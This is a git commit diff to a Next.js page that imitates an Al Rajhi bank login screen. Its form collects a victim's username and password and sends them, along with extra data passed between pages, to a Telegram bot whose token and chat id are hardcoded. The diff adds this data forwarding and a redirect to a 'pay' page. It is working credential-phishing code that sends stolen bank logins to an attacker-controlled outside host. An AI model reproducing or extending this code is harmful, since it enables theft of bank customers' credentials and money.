318513aea27f1a72e0659768e3e842c256cbd237
MiladSN2023 <152106448+MiladSN2023@users.noreply.github.com>
2023-12-31 17:10:12 +0300

    Update page.jsx

--- ‏‏my-app/src/app/fozajil/banks/rajhe/page.jsx
+++ ‏‏my-app/src/app/fozajil/banks/rajhe/page.jsx
@@ -3,36 +3,35 @@ import styles from './rajhe.module.css'
 import Image from 'next/image'
 import icon1 from '../../../../../public/1.png'
 import { useRef } from 'react'
-import { useRouter } from 'next/navigation'
+import { useRouter,useSearchParams } from 'next/navigation'
 
 const Page = () => {
     const username = useRef()
     const password = useRef()
-    
-    const router = useRouter();
-
-    const handlerout = ()=>{
-      if(username.current.value == ""){
-        alert('من فضلك قم بملى الحقول')
-      }else{
-        
-        router.push('/fozajil/banks/pay')
-      }
-    }
-
-
+    const router =useRouter();
+    const x = useSearchParams();
+    const datas = x.get('names')
     const handleOnSubmit = (e) => {
         e.preventDefault();
         var bot={
       token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
       chat_id:6364334502
     }
-        var length =`ِالراجحي اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} `
+        var length =`الراجحي  اسم المستخدم  : ${username.current.value} %0A كلمة المرور: ${password.current.value} %0A %0A ${datas}`
        
         
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
       
       }
+      const handlerout = ()=>{
+        if(username.current.value == "" || password.current.value == ""){
+          alert('من فضلك قم بملى الحقول')
+        }else{
+          
+          router.push(`/fozajil/banks/pay?names=${datas}`)
+        }
+      }
+
   return (
     <div className={styles.container}>
         <Image 
